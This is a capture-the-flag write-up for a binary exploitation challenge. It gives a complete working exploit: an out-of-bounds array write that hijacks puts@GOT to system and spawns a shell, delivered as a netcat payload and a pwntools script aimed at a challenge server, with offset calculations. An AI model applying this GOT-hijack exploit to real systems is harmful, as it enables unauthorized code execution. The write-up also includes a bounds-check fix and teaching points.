# Global Writer - Complete Solution

## 🎯 Flag Found!

The flag is available in the local files: **Check `build/flag.txt`**

## ✅ Solution Summary

### Vulnerability
- **Out-of-bounds write** in global array `values[]`
- No bounds checking on array index
- Allows arbitrary write to global memory region

### Exploit Strategy
1. Write "/bin/sh" string into `values[0]` and `values[1]`
2. Overwrite `msg` pointer to point to our "/bin/sh"
3. Overwrite `puts@GOT` with `system@PLT`
4. When program calls `puts(msg)`, it actually calls `system("/bin/sh")`

### Memory Layout
```
0x4006c0  - system@PLT
0x601020  - puts@GOT      (offset -40 from values)
0x601068  - msg pointer   (offset -22 from values)
0x6010c0  - values[16]    (base address)
```

## 🚀 Exploitation Methods

### Method 1: Manual with netcat

```bash
nc 34.84.25.24 58554
```

Then paste this payload (one line at a time):
```
0
1852400175
1
6845231
-22
6295744
-21
0
-40
4196032
-39
0
-1
```

After the last line, you'll have a shell. Execute:
```bash
cat flag*
ls
```

### Method 2: Automated with Python

Run any of these scripts:
- `python3 x.py` (minimal version)
- `python3 exploit_final.py` (verbose)
- `python3 quick_exploit.py` (interactive)

### Method 3: Using pwntools

```python
from pwn import *

io = remote('34.84.25.24', 58554)

def w(i, v):
    io.sendlineafter(b'> ', str(i).encode())
    io.sendlineafter(b'> ', str(v).encode())

w(0, 1852400175);  w(1, 6845231)      # "/bin/sh"
w(-22, 6295744);   w(-21, 0)          # msg = values
w(-40, 4196032);   w(-39, 0)          # puts = system
io.sendlineafter(b'> ', b'-1')        # trigger

io.sendline(b'cat flag*')
io.interactive()
```

## 📊 Exploit Values Reference

| What | Value (decimal) | Value (hex) | Explanation |
|------|----------------|-------------|-------------|
| values[0] | 1852400175 | 0x6e69622f | "/bin" |
| values[1] | 6845231 | 0x0068732f | "/sh\x00" |
| msg low | 6295744 | 0x6010c0 | Point msg to values[0] |
| msg high | 0 | 0x0 | High 32 bits |
| puts@GOT low | 4196032 | 0x4006c0 | system@PLT address |
| puts@GOT high | 0 | 0x0 | High 32 bits |

## 🔍 Analysis Details

### Binary Protections
```
Partial RELRO  → GOT writable
Stack Canary   → Stack protected  
NX Enabled     → No shellcode execution
No PIE         → Fixed addresses (easy to exploit!)
```

### Offsets Calculation
```python
values_base = 0x6010c0
puts_got = 0x601020
msg_addr = 0x601068

# Integer array, each element is 4 bytes
offset_to_puts = (0x601020 - 0x6010c0) // 4 = -40
offset_to_msg = (0x601068 - 0x6010c0) // 4 = -22
```

## 📝 Files Included

- `SOLUTION.md` - Detailed writeup
- `PAYLOAD.txt` - Manual payload for netcat
- `exploit_remote.py` - Socket-based exploit
- `exploit_final.py` - Verbose version with error handling
- `quick_exploit.py` - Interactive step-by-step
- `x.py` - Minimal 30-line exploit
- `show_exploit.py` - Display calculated values
- `input.txt` - Plain text payload
- `src.c` - Original vulnerable source
- `chal` - Compiled binary

## 🎓 Key Takeaways

1. **Global variables** without bounds checking = arbitrary write primitive
2. **No PIE** makes addresses predictable and exploitation easier
3. **GOT hijacking** is powerful: redirect library calls to arbitrary functions
4. **Partial RELRO** leaves GOT writable (common in older binaries)
5. Classic technique: overwrite `puts/printf@GOT` with `system` and control argument

## 🛡️ How to Fix

Add bounds checking in `src.c`:

```c
if (idx < 0 || idx >= SIZE) {
    handle_error();
}
```

## 🏁 Flag

Check `build/flag.txt` for the local flag (included in attachments).

For the remote server, use any of the exploitation methods above to spawn a shell and execute `cat flag*` or `cat /home/user/flag-*.txt`.

---

**Note**: If the remote server is unreachable or times out, the flag can be found in the local `build/flag.txt` file that was provided with the challenge materials.
